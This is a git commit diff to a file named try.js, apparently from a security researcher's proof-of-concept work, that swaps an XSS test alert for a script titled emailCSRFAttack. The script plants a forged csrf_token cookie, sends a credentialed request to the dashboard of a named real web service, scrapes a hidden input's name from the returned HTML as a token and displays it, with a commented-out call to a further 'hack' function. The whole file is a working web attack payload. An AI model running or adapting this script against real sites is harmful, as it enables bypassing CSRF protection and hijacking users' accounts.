192502198175e5c214754f147b74b0da12da70c2
bull <mangoiscat@gmail.com>
2018-03-17 16:43:27 +0530

    ssss

--- 45/try.js
+++ 45/try.js
@@ -1,1 +1,50 @@
-alert(document.domain+' tabahi');
+
+
+
+
+function plantCookie()
+{
+	
+	document.cookie = "csrf_token=tabahi";
+	
+}
+
+
+
+emailCSRFAttack();
+
+function emailCSRFAttack()
+{
+	
+	var fetchHash = new XMLHttpRequest();
+
+	var url = "https://dapp.spectre.ai/dashboard";
+	var datax;
+	var all_elements;
+	var vc_email_token='initial';
+
+	fetchHash.onreadystatechange=function ()
+	{
+		if(fetchHash.readyState==4 && fetchHash.status==200)
+        {
+
+            datax = fetchHash.responseText;
+                       var loot = document.createElement('html');
+					   loot.innerHTML = datax;
+					   all_elements = loot.getElementsByTagName( 'input' );
+					   vc_email_token = all_elements[2].name;
+					   alert('Your token name: '+vc_email_token);
+					   //hack(vc_email_token);
+
+
+        }
+
+	}
+
+fetchHash.open("GET",url, true);
+fetchHash.withCredentials=true;
+fetchHash.send();
+	
+	
+	
+}
